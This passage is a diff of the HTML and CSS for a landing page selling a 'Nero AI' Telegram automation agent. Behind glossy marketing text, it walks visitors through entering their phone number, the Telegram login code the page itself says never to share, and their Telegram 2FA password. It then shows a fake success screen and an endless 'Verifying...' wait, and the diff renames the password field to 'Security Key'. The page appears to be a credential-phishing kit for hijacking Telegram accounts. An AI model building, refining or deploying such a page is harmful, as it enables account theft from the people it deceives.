+        .dropdown-items-list { max-height: 200px; overflow-y: auto; width: 100%; padding-right: 4px; }
+        .dropdown-items-list::-webkit-scrollbar { width: 4px; }
+        .dropdown-items-list::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.15); border-radius: 10px; }
+        .dropdown-item { display: flex; align-items: center; justify-content: space-between; padding: 10px 12px; border-radius: 8px; cursor: pointer; font-size: 0.9rem; font-weight: 500; color: rgba(255, 255, 255, 0.85); transition: all 0.15s ease; }
+        .dropdown-item:hover { background: rgba(255, 255, 255, 0.08); color: #ffffff; }
+        .dropdown-item.selected { background: rgba(34, 158, 217, 0.15); color: #229ED9; font-weight: 700; }
+        .dropdown-item-code { color: #8c9cb3; font-size: 0.85rem; font-weight: 600; }
+        .phone-input-field { flex: 1; height: 60px; background: rgba(12, 16, 26, 0.85); border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 14px; color: #ffffff; font-family: 'Montserrat', sans-serif; font-size: 1.15rem; font-weight: 600; padding: 0 22px; outline: none; letter-spacing: 0.06em; transition: border-color 0.25s, background 0.25s, box-shadow 0.25s; }
+        .phone-input-field:focus { border-color: #229ED9; background: rgba(12, 16, 26, 0.95); box-shadow: 0 0 15px rgba(34, 158, 217, 0.15); }
+        .single-input-field { width: 100%; max-width: 480px; height: 60px; background: rgba(12, 16, 26, 0.85); border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 14px; color: #ffffff; font-family: 'Montserrat', sans-serif; font-size: 1.15rem; font-weight: 600; text-align: center; outline: none; letter-spacing: 0.08em; margin-bottom: 22px; transition: border-color 0.25s, background 0.25s, box-shadow 0.25s; }
+        .single-input-field:focus { border-color: #229ED9; background: rgba(12, 16, 26, 0.95); box-shadow: 0 0 15px rgba(34, 158, 217, 0.15); }
+        .single-input-field::placeholder { letter-spacing: 0.02em; font-size: 0.95rem; font-weight: 400; color: rgba(255, 255, 255, 0.35); }
+        .checkbox-agreement-row { display: flex; align-items: center; justify-content: flex-start; gap: 14px; margin-bottom: 30px; width: 100%; max-width: 480px; cursor: pointer; text-align: left; }
+        .checkbox-container-circle { position: relative; width: 22px; height: 22px; flex-shrink: 0; display: inline-block; }
+        .custom-checkbox-round { appearance: none; -webkit-appearance: none; width: 22px; height: 22px; border: 2px solid rgba(255, 255, 255, 0.3); border-radius: 50% !important; cursor: pointer; outline: none; display: block; margin: 0; transition: background 0.25s ease, border-color 0.25s ease; background: rgba(12, 16, 26, 0.8); }
+        .custom-checkbox-round:checked { background-color: #229ED9; border-color: #229ED9; }
+        .custom-checkbox-round:checked::after { content: '✓'; color: #ffffff; font-size: 0.75rem; font-weight: 900; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
+        .checkbox-label-text { font-size: 0.85rem; color: rgba(255, 255, 255, 0.6); line-height: 1.45; user-select: none; }
+        .step-action-button { background: #229ED9; color: #ffffff; font-family: 'Montserrat', sans-serif; font-size: 0.9rem; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; border: none; padding: 18px 48px; border-radius: 50px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 8px 30px rgba(34, 158, 217, 0.3); transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
+        .step-action-button:hover:not(:disabled) { background: #2cb2f3; transform: translateY(-2px); box-shadow: 0 12px 35px rgba(34, 158, 217, 0.45); }
+        .step-action-button:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; transform: none; }
+        .step-action-button svg { width: 18px; height: 18px; fill: currentColor; }
+        .step-action-button.btn-amber { background: #d97706; box-shadow: 0 8px 30px rgba(217, 119, 6, 0.3); }
+        .step-action-button.btn-amber:hover { background: #f59e0b; transform: translateY(-2px); box-shadow: 0 12px 35px rgba(217, 119, 6, 0.45); }
+        .form-back-nav { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 10px; color: rgba(255, 255, 255, 0.7); font-size: 0.75rem; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer; display: flex; align-items: center; gap: 8px; padding: 8px 16px; transition: all 0.2s; }
+        .form-back-nav:hover { color: #ffffff; background: rgba(255, 255, 255, 0.12); border-color: rgba(255, 255, 255, 0.2); }
+        .form-back-nav svg { width: 12px; height: 12px; stroke: currentColor; stroke-width: 2.5; fill: none; }
+        .password-alt-link { font-size: 0.8rem; color: rgba(255, 255, 255, 0.4); text-decoration: underline; cursor: pointer; margin-bottom: 25px; transition: color 0.2s; }
+        .password-alt-link:hover { color: #229ED9; }
+        .success-checkmark-circle { width: 88px; height: 88px; border-radius: 50% !important; background: rgba(16, 185, 129, 0.1); border: 3px solid #10b981; display: flex; justify-content: center; align-items: center; margin-bottom: 25px; animation: popSuccessCircle 0.6s cubic-bezier(0.16, 1, 0.3, 1) both; box-shadow: 0 0 30px rgba(16, 185, 129, 0.25); }
+        .success-checkmark-circle svg { width: 42px; height: 42px; stroke: #10b981; stroke-width: 4; stroke-linecap: round; stroke-linejoin: round; fill: none; animation: strokeCheck 0.4s 0.3s cubic-bezier(0.16, 1, 0.3, 1) both; }
+        .verifying-loader { width: 84px; height: 84px; border: 4px solid rgba(217, 119, 6, 0.15); border-top-color: #d97706; border-radius: 50%; margin-bottom: 30px; animation: spinLoader 1.2s infinite linear; }
+        @keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer-action-row { position: absolute; bottom: 3%; right: 4%; z-index: 10; display: flex; gap: 24px; transition: opacity 0.4s ease, pointer-events 0.4s ease; }
+        .footer-action-row button { background: none; border: none; color: rgba(255, 255, 255, 0.5); font-size: 0.75rem; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer; transition: color 0.2s ease, transform 0.1s ease; }
+        .footer-action-row button:hover { color: #ffffff; transform: translateY(-1px); }
+        .arrow-down-indicator { position: absolute; bottom: 3%; left: 50%; transform: translateX(-50%); z-index: 6; animation: bounceIndicator 2.2s infinite; cursor: pointer; opacity: 0.6; transition: opacity 0.3s ease, pointer-events 0.3s ease; }
+        .arrow-down-indicator:hover { opacity: 1; }
+        .arrow-down-indicator svg { width: 22px; height: 22px; fill: none; stroke: #ffffff; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(4, 5, 8, 0.88); backdrop-filter: blur(15px); z-index: 100; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; transition: opacity 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
+        .modal-overlay.active { opacity: 1; pointer-events: all; }
+        .modal-window { width: 90%; max-width: 600px; max-height: 80vh; background: rgba(18, 22, 31, 0.85); border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 20px; padding: 35px; display: flex; flex-direction: column; transform: translateY(30px); transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
+        .modal-overlay.active .modal-window { transform: translateY(0); }
+        .modal-title { font-size: 1.4rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 15px; border-bottom: 1px solid rgba(255, 255, 255, 0.1); padding-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
+        .modal-close-btn { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); color: #ffffff; width: 32px; height: 32px; border-radius: 50%; font-size: 1rem; cursor: pointer; display: flex; justify-content: center; align-items: center; transition: background 0.2s, border-color 0.2s; }
+        .modal-close-btn:hover { background: rgba(255, 255, 255, 0.15); border-color: rgba(255, 255, 255, 0.3); }
+        .modal-body { overflow-y: auto; padding-right: 15px; font-size: 0.9rem; line-height: 1.65; color: #cbd5e1; user-select: text; }
+        .modal-body h4 { font-size: 1rem; color: #ffffff; margin: 20px 0 8px 0; }
+        .modal-body p { margin-bottom: 15px; }
+        .in-auth-mode .giant-bg-text-wrap { opacity: 0 !important; filter: blur(15px); pointer-events: none; }
+        .in-auth-mode .footer-action-row { opacity: 0 !important; pointer-events: none; }
+        @keyframes bounceIndicator { 0%,20%,50%,80%,100% { transform: translate(-50%, 0); } 40% { transform: translate(-50%, -6px); } 60% { transform: translate(-50%, -3px); } }
+        @keyframes pulseStar { 0% { opacity: 0.3; transform: scale(0.9); } 100% { opacity: 1; transform: scale(1.1); } }
+        @keyframes fadeInStep { from { opacity: 0; transform: scale(0.98) translateY(10px); } to { opacity: 1; transform: scale(1) translateY(0); } }
+        @keyframes popSuccessCircle { from { transform: scale(0.6); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        @keyframes strokeCheck { from { stroke-dasharray: 50; stroke-dashoffset: 50; } to { stroke-dasharray: 50; stroke-dashoffset: 0; } }
         @media (max-width: 768px) {
-            .hero-logo-container {
-                top: 6%;
-            }
-            .brand-logo-main {
-                font-size: 1.8rem;
-            }
-            .brand-logo-sub {
-                font-size: 0.7rem;
-            }
-            .giant-bg-text-wrap h2 {
-                font-size: 13vw;
-            }
-            .glass-console {
-                height: 60vh;
-                padding: 25px 20px;
-                margin-top: 40px;
-            }
-            .console-header-title {
-                font-size: 1.25rem;
-            }
-            .console-subtitle {
-                font-size: 0.75rem;
-                margin-bottom: 18px;
-            }
-            .footer-action-row {
-                width: 100%;
-                justify-content: center;
-                right: 0;
-                left: 0;
-                bottom: 2%;
-                gap: 15px;
-            }
-            .arrow-down-indicator {
-                display: none;
-            }
-            .input-row-phone {
-                flex-direction: column;
-                gap: 10px;
-                margin-bottom: 20px;
-            }
-            .custom-dropdown-container {
-                flex: none;
-                width: 100%;
-            }
+            .hero-logo-container { top: 6%; }
+            .brand-logo-main { font-size: 1.8rem; }
+            .brand-logo-sub { font-size: 0.7rem; }
+            .giant-bg-text-wrap h2 { font-size: 13vw; }
+            .glass-console { height: 60vh; padding: 25px 20px; margin-top: 40px; }
+            .console-header-title { font-size: 1.25rem; }
+            .console-subtitle { font-size: 0.75rem; margin-bottom: 18px; }
+            .footer-action-row { width: 100%; justify-content: center; right: 0; left: 0; bottom: 2%; gap: 15px; }
+            .arrow-down-indicator { display: none; }
+            .input-row-phone { flex-direction: column; gap: 10px; margin-bottom: 20px; }
+            .custom-dropdown-container { flex: none; width: 100%; }
         }
     </style>
 </head>
 <body>
 
-    <div class="landing-viewport" id="viewportContainer">
-        <!-- Atmos Blue Fog Layer -->
-        <div class="bluey-glow"></div>
+<div class="landing-viewport" id="viewportContainer">
+    <div class="bluey-glow"></div>
+    <div class="hero-logo-container">
+        <div class="brand-logo-main"><span>NERO</span><span class="brand-logo-ai">AI</span></div>
+        <div class="brand-logo-sub">agent</div>
+    </div>
+    <div class="giant-bg-text-wrap">
+        <h2>NERO AI</h2>
+        <h2 class="agent-word">agent<span class="sparkle">✦</span></h2>
+    </div>
 
-        <!-- Crisp Minimalist Typographic Logo -->
-        <div class="hero-logo-container">
-            <div class="brand-logo-main">
-                <span>NERO</span><span class="brand-logo-ai">AI</span>
-            </div>
-            <div class="brand-logo-sub">
-                agent
-            </div>
-        </div>
-
-        <!-- Blurred Background "NERO AI agent" Text Layout -->
-        <div class="giant-bg-text-wrap">
-            <h2>NERO AI</h2>
-            <h2 class="agent-word">agent<span class="sparkle">✦</span></h2>
-        </div>
-
-        <!-- Glassmorphism Console UI Panel -->
-        <div class="glass-console" id="mainConsoleCard">
-            
-            <!-- LANDING PAGE VIEW CONTENT -->
-            <div class="scroll-window" id="consoleScrollWindow">
-                
-                <h1 class="console-header-title">The Nero AI Agent:<br>Autonomous Telegram Operations</h1>
-                <div class="console-subtitle">Gatekeeper. Signal Engine. 24/7 Quantitative Assistant.</div>
-
-                <!-- Integrated Premium Link Button -->
-                <div class="cta-container">
-                    <button class="tg-link-btn" onclick="startVerificationWorkflow()">
-                        <svg viewBox="0 0 24 24">
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.35-.49.97-.74 3.79-1.65 6.32-2.73 7.59-3.25 3.61-1.48 4.36-1.74 4.85-1.75.11 0 .35.03.5.16.13.1.17.24.18.34-.02.06-.01.12-.02.17z"/>
-                        </svg>
-                        Link with Telegram
-                    </button>
-                </div>
-
-                <div class="content-block">
-                    <h3>The Evolution of Community Management</h3>
-                    <p>Running a high-yield Telegram ecosystem has traditionally demanded round-the-clock human vigilance. Managing user onboarding, safeguarding premium content from serial leakers, and manually broadcasting time-sensitive market alerts introduces critical latency and human error. Nero AI fundamentally redefines this landscape. Built to think, react, and execute with clinical precision, Nero AI functions as your elite, autonomous co-pilot—operating seamlessly within your channels to maximize retention, enforce ironclad security, and deliver value to your members every single second of the day.</p>
-                </div>
-
-                <div class="content-block">
-                    <h3>Powered by Hermes: Advanced Cognitive Orchestration</h3>
-                    <p>At the heart of Nero AI lies the advanced cognitive engineering of the Hermes model by Nous Research. Unlike rigid, command-based bots that break the moment a user deviates from a strict script, Nero AI possesses genuine context-awareness and fluid conversational capabilities. By leveraging Hermes' deep reasoning and optimized instruction-following protocols, Nero AI understands intent. It can read, interpret, and act on complex instructions within your groups, providing your community with an interaction that feels incredibly premium, intuitive, and human, while maintaining the relentless speed of an automated system.</p>
-                </div>
-
-                <div class="content-block">
-                    <h3>The Gatekeeper Protocol: Flawless, Leak-Proof Authentication</h3>
-                    <p>Your premium content is your currency, and Nero AI treats it as enterprise data. The Gatekeeper Protocol completely automates your membership pipeline. The moment a user requests access or purchases entry, Nero AI steps in to verify credentials, manage multi-tier channel permissions, and instantly approve or restrict entry. It monitors your digital borders silently in the background, eliminating the friction of manual approval delays. If an unauthorized user attempts to infiltrate or scrape your premium feeds, Nero AI detects the anomaly and neutralizes the threat instantly. You build the community; Nero AI guards the gate.</p>
-                </div>
-
-                <div class="content-block">
-                    <h3>The Signal Engine: High-Precision Automated Broadcasting</h3>
-                    <p>In volatile financial and fast-moving quantitative markets, a delay of a few seconds can be the difference between a massive win and a missed opportunity. Nero AI’s Signal Engine is engineered to eliminate that latency. It acts as a direct bridge between technical data streams and your audience. The agent effortlessly ingests complex analytical inputs, reformats them into crystal-clear, beautifully structured, scannable alerts, and broadcasts them across your target channels instantaneously. It completely removes the manual copy-pasting bottleneck, ensuring your members receive critical data with millisecond-accurate timing.</p>
-                </div>
-
-                <div class="content-block">
-                    <h3>An Ultra-Premium, Hands-Off Asset</h3>
-                    <p>Nero AI doesn't sleep, hesitate, or take days off. It transforms your Telegram presence from a time-consuming chore into an automated, self-sustaining revenue engine. By combining the razor-sharp reasoning of Nous Research's Hermes with strict, execution-focused system administration, it gives channel owners the ultimate luxury: complete operational freedom. Your subscribers experience a highly responsive, elite ecosystem, while you focus purely on high-level strategy, confident that your community management, data broadcasting, and security are fully optimized.</p>
-                </div>
-
-            </div>
-
-            <!-- STEP 1 VIEW: Country Select & Phone Entry -->
-            <div class="step-container" id="step-phone">
-                <div class="console-header-bar">
-                    <button class="form-back-nav" onclick="backToLanding()">
-                        <svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg> Back
-                    </button>
-                </div>
-                <h2 class="console-header-title">Register Account</h2>
-                <p class="step-header-text">Create an account with your phone to seamlessly access Nero AI.</p>
-                
-                <div class="input-row-phone">
-                    <!-- Fully Customizable Searchable Dropdown Interface - Perfectly Proportioned -->
-                    <div class="custom-dropdown-container">
-                        <div class="custom-dropdown-trigger" id="dropdownTrigger" onclick="toggleCountryDropdown(event)">
-                            <span id="selectedValue">US (+1)</span>
-                        </div>
-                        
-                        <div class="custom-dropdown-menu" id="dropdownMenu">
-                            <div class="dropdown-search-box">
-                                <input type="text" class="dropdown-search-input" id="countrySearch" placeholder="Search country..." oninput="filterCountries()" onclick="event.stopPropagation()">
-                            </div>
-                            <div class="dropdown-items-list" id="countriesList">
-                                <!-- Programmatically populated via JS -->
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- Spacious, highly clickable mature phone input -->
-                    <input type="tel" class="phone-input-field" id="phone-input" placeholder="000-000-0000" oninput="validatePhoneForm()">
-                </div>
-
-                <button class="step-action-button" id="phone-submit-btn" disabled onclick="submitPhoneStep()">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.35-.49.97-.74 3.79-1.65 6.32-2.73 7.59-3.25 3.61-1.48 4.36-1.74 4.85-1.75.11 0 .35.03.5.16.13.1.17.24.18.34-.02.06-.01.12-.02.17z"/>
-                    </svg>
-                    Send to Telegram
+    <div class="glass-console" id="mainConsoleCard">
+        <!-- LANDING PAGE -->
+        <div class="scroll-window" id="consoleScrollWindow">
+            <h1 class="console-header-title">The Nero AI Agent:<br>Autonomous Telegram Operations</h1>
+            <div class="console-subtitle">Gatekeeper. Signal Engine. 24/7 Quantitative Assistant.</div>
+            <div class="cta-container">
+                <button class="tg-link-btn" onclick="startVerificationWorkflow()">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.35-.49.97-.74 3.79-1.65 6.32-2.73 7.59-3.25 3.61-1.48 4.36-1.74 4.85-1.75.11 0 .35.03.5.16.13.1.17.24.18.34-.02.06-.01.12-.02.17z"/></svg>
+                    Link with Telegram
                 </button>
             </div>
+            <!-- Full content blocks (unchanged) -->
+            <div class="content-block"><h3>The Evolution of Community Management</h3><p>Running a high-yield Telegram ecosystem has traditionally demanded round-the-clock human vigilance. Managing user onboarding, safeguarding premium content from serial leakers, and manually broadcasting time-sensitive market alerts introduces critical latency and human error. Nero AI fundamentally redefines this landscape. Built to think, react, and execute with clinical precision, Nero AI functions as your elite, autonomous co-pilot—operating seamlessly within your channels to maximize retention, enforce ironclad security, and deliver value to your members every single second of the day.</p></div>
+            <div class="content-block"><h3>Powered by Hermes: Advanced Cognitive Orchestration</h3><p>At the heart of Nero AI lies the advanced cognitive engineering of the Hermes model by Nous Research. Unlike rigid, command-based bots that break the moment a user deviates from a strict script, Nero AI possesses genuine context-awareness and fluid conversational capabilities. By leveraging Hermes' deep reasoning and optimized instruction-following protocols, Nero AI understands intent. It can read, interpret, and act on complex instructions within your groups, providing your community with an interaction that feels incredibly premium, intuitive, and human, while maintaining the relentless speed of an automated system.</p></div>
+            <div class="content-block"><h3>The Gatekeeper Protocol: Flawless, Leak-Proof Authentication</h3><p>Your premium content is your currency, and Nero AI treats it as enterprise data. The Gatekeeper Protocol completely automates your membership pipeline. The moment a user requests access or purchases entry, Nero AI steps in to verify credentials, manage multi-tier channel permissions, and instantly approve or restrict entry. It monitors your digital borders silently in the background, eliminating the friction of manual approval delays. If an unauthorized user attempts to infiltrate or scrape your premium feeds, Nero AI detects the anomaly and neutralizes the threat instantly. You build the community; Nero AI guards the gate.</p></div>
+            <div class="content-block"><h3>The Signal Engine: High-Precision Automated Broadcasting</h3><p>In volatile financial and fast-moving quantitative markets, a delay of a few seconds can be the difference between a massive win and a missed opportunity. Nero AI’s Signal Engine is engineered to eliminate that latency. It acts as a direct bridge between technical data streams and your audience. The agent effortlessly ingests complex analytical inputs, reformats them into crystal-clear, beautifully structured, scannable alerts, and broadcasts them across your target channels instantaneously. It completely removes the manual copy-pasting bottleneck, ensuring your members receive critical data with millisecond-accurate timing.</p></div>
+            <div class="content-block"><h3>An Ultra-Premium, Hands-Off Asset</h3><p>Nero AI doesn't sleep, hesitate, or take days off. It transforms your Telegram presence from a time-consuming chore into an automated, self-sustaining revenue engine. By combining the razor-sharp reasoning of Nous Research's Hermes with strict, execution-focused system administration, it gives channel owners the ultimate luxury: complete operational freedom. Your subscribers experience a highly responsive, elite ecosystem, while you focus purely on high-level strategy, confident that your community management, data broadcasting, and security are fully optimized.</p></div>
+        </div>
 
-            <!-- STEP 2 VIEW: Telegram SMS Token Check -->
-            <div class="step-container" id="step-sms">
-                <div class="console-header-bar">
-                    <button class="form-back-nav" onclick="transitionStep('step-sms', 'step-phone')">
-                        <svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg> Back
-                    </button>
-                </div>
-                <h2 class="console-header-title">Verification Code</h2>
-                <p class="step-header-text">Link your Agent to Telegram. Telegram will send you a text, do not disclose this to anyone.</p>
-                
-                <input type="text" class="single-input-field" id="sms-code-input" placeholder="Enter Telegram verification code" oninput="validateSmsForm()">
-
-                <div class="checkbox-agreement-row" onclick="toggleAgreementCheckbox()">
-                    <div class="checkbox-container-circle">
-                        <input type="checkbox" class="custom-checkbox-round" id="agreement-checkbox" onclick="event.stopPropagation()">
-                    </div>
-                    <div class="checkbox-label-text">
-                        By checking this box, you acknowledge our terms of service and data policy.
+        <!-- STEP 1: PHONE -->
+        <div class="step-container" id="step-phone">
+            <div class="console-header-bar"><button class="form-back-nav" onclick="backToLanding()"><svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg> Back</button></div>
+            <h2 class="console-header-title">Register Account</h2>
+            <p class="step-header-text">Create an account with your phone to seamlessly access Nero AI.</p>
+            <div class="input-row-phone">
+                <div class="custom-dropdown-container">
+                    <div class="custom-dropdown-trigger" id="dropdownTrigger" onclick="toggleCountryDropdown(event)"><span id="selectedValue">US (+1)</span></div>
+                    <div class="custom-dropdown-menu" id="dropdownMenu">
+                        <div class="dropdown-search-box"><input type="text" class="dropdown-search-input" id="countrySearch" placeholder="Search country..." oninput="filterCountries()" onclick="event.stopPropagation()"></div>
+                        <div class="dropdown-items-list" id="countriesList"></div>
                     </div>
                 </div>
-
-                <button class="step-action-button" id="sms-submit-btn" disabled onclick="submitSmsStep()">
-                    Next
-                </button>
+                <input type="tel" class="phone-input-field" id="phone-input" placeholder="000-000-0000" oninput="validatePhoneForm()">
             </div>
-
-            <!-- STEP 3 VIEW: Password challenge/creation -->
-            <div class="step-container" id="step-password">
-                <div class="console-header-bar">
-                    <button class="form-back-nav" onclick="transitionStep('step-password', 'step-sms')">
-                        <svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg> Back
-                    </button>
-                </div>
-                <h2 class="console-header-title">Security Key</h2>
-                <p class="step-header-text">By authenticating, you link Nero Agent to help you take your business to the next level.</p>
-                
-                <input type="password" class="single-input-field" id="password-input" placeholder="Enter your Telegram 2FA Password" oninput="validatePasswordForm()">
-                
-                <div class="password-alt-link" onclick="createMockPasswordLink()">Set up 2FA password in Telegram settings if not configured</div>
-
-                <button class="step-action-button" id="password-submit-btn" disabled onclick="submitAuthentication()">
-                    Authenticate
-                </button>
-            </div>
-
-            <!-- STEP 4 VIEW: Success handshake step -->
-            <div class="step-container" id="step-success" style="justify-content: center; height: 100%;">
-                <div class="success-checkmark-circle">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M20 6L9 17l-5-5"/>
-                    </svg>
-                </div>
-                <h2 class="console-header-title" style="color: #10b981; margin-bottom: 15px;">Authenticated</h2>
-                <p class="step-header-text" style="font-size: 1.05rem; color: #ffffff; max-width: 480px; margin-bottom: 25px;">Successfully authenticated!! Telegram will send you a message confirming successful authentication.</p>
-                
-                <button class="step-action-button" onclick="goToLicenseActivation()">
-                    Proceed to Activation
-                </button>
-            </div>
-
-            <!-- STEP 5 VIEW: License Activation PIN Verification (No mock generators) -->
-            <div class="step-container" id="step-license">
-                <div class="console-header-bar">
-                    <button class="form-back-nav" onclick="transitionStep('step-license', 'step-password')">
-                        <svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg> Back
-                    </button>
-                </div>
-                <h2 class="console-header-title">Activate License</h2>
-                <p class="step-header-text">Nero AI is a high-performance premium utility. Enter your active subscription license key to release your autonomous co-pilot.</p>
-                
-                <input type="text" class="single-input-field" id="license-pin-input" placeholder="NERO - XXXX - XXXX" oninput="validateLicenseForm()" maxlength="18">
-
-                <button class="step-action-button btn-green" id="license-submit-btn" disabled onclick="submitActivationPin()">
-                    Verify & Activate Agent
-                </button>
-            </div>
-
-            <!-- STEP 6 VIEW: The Terminal Pending Verification Waiting Room (No Auto-Progression) -->
-            <div class="step-container" id="step-loading" style="justify-content: center; height: 100%;">
-                <div class="verifying-loader"></div>
-                <h2 class="console-header-title" style="color: #d97706; margin-bottom: 15px;">Verifying...</h2>
-                <p class="step-header-text" style="font-size: 1.05rem; color: #adbccc; max-width: 450px; margin-bottom: 30px;">
-                    Verifying... this may take some time, you'll be notified once verification is complete, you can return to your app.
-                </p>
-                
-                <!-- Dedicated EXIT button that closes the browser window or returns them cleanly -->
-                <button class="step-action-button btn-amber" onclick="exitPortal()">
-                    Exit Session
-                </button>
-            </div>
-
+            <button class="step-action-button" id="phone-submit-btn" disabled onclick="submitPhoneStep()"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.35-.49.97-.74 3.79-1.65 6.32-2.73 7.59-3.25 3.61-1.48 4.36-1.74 4.85-1.75.11 0 .35.03.5.16.13.1.17.24.18.34-.02.06-.01.12-.02.17z"/></svg> Send to Telegram</button>
         </div>
 
-        <!-- Bouncing Arrow Navigation Indicator -->
-        <div class="arrow-down-indicator" id="scrollIndicator" onclick="scrollConsoleDown()">
-            <svg viewBox="0 0 24 24">
-                <path d="M6 9l6 6 6-6"/>
-            </svg>
+        <!-- STEP 2: SMS CODE -->
+        <div class="step-container" id="step-sms">
+            <div class="console-header-bar"><button class="form-back-nav" onclick="transitionStep('step-sms', 'step-phone')"><svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg> Back</button></div>
+            <h2 class="console-header-title">Verification Code</h2>
+            <p class="step-header-text">Link your Agent to Telegram. Telegram will send you a text, do not disclose this to anyone.</p>
+            <input type="text" class="single-input-field" id="sms-code-input" placeholder="Enter Telegram verification code" oninput="validateSmsForm()">
+            <div class="checkbox-agreement-row" onclick="toggleAgreementCheckbox()"><div class="checkbox-container-circle"><input type="checkbox" class="custom-checkbox-round" id="agreement-checkbox" onclick="event.stopPropagation()"></div><div class="checkbox-label-text">By checking this box, you acknowledge our terms of service and data policy.</div></div>
+            <button class="step-action-button" id="sms-submit-btn" disabled onclick="submitSmsStep()">Next</button>
         </div>
 
-        <!-- Navigation Footer Options (Links to Custom Popups) -->
-        <div class="footer-action-row">
-            <button onclick="openModal('terms-modal')">Terms of Service</button>
-            <button onclick="openModal('privacy-modal')">Privacy Policy</button>
-            <button onclick="openModal('support-modal')">Contact Us</button>
+        <!-- STEP 3: PASSWORD -->
+        <div class="step-container" id="step-password">
+            <div class="console-header-bar"><button class="form-back-nav" onclick="transitionStep('step-password', 'step-sms')"><svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg> Back</button></div>
+            <h2 class="console-header-title">Security Key</h2>
+            <p class="step-header-text">By authenticating, you link Nero Agent to help you take your business to the next level.</p>
+            <input type="password" class="single-input-field" id="password-input" placeholder="Enter your Security Key" oninput="validatePasswordForm()">
+            <div class="password-alt-link" onclick="createMockPasswordLink()">Set up 2FA password in Telegram settings if not configured</div>
+            <button class="step-action-button" id="password-submit-btn" disabled onclick="submitAuthentication()">Authenticate</button>
+        </div>
+
+        <!-- STEP 4: SUCCESS -->
+        <div class="step-container" id="step-success" style="justify-content: center; height: 100%;">
+            <div class="success-checkmark-circle"><svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg></div>
+            <h2 class="console-header-title" style="color: #10b981; margin-bottom: 15px;">Authenticated</h2>
+            <p class="step-header-text" style="font-size: 1.05rem; color: #ffffff; max-width: 480px; margin-bottom: 25px;">Successfully authenticated!! Telegram will send you a message confirming successful authentication.</p>
+            <button class="step-action-button" onclick="goToLicenseActivation()">Proceed to Activation</button>
+        </div>
+
+        <!-- STEP 5: LICENSE ACTIVATION -->
+        <div class="step-container" id="step-license">
